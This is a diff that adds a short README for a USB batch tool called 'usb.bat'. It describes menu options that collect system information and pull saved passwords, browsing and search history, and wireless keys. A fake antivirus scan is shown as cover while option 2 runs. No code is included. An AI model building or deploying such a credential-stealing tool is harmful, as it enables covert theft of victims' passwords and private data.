@@ -1,0 +1,22 @@
+This tool is programmed and designed by RAHUL DORA
+use this tool at your own risk
+
+----------------------------------------
+HOW TO USE
+----------------------------------------
+
+> Open "usb.bat" and choose any option you want.
+
+> choose "1" for get all informnation about that computer and store it in a txt file.
+
+> choose "2" for get all the save password,last search,BrowsingHistory,wireless keys.
+
+WHEN YOU CHOOSE OPTION "2" A FAKE ANTIVIRUS SCANNING PROCESS WILL START.
+
+> choose "3" for more tools.
+
+> choose "4" for about.
+
+> choose "5" for exit.
+
+ 
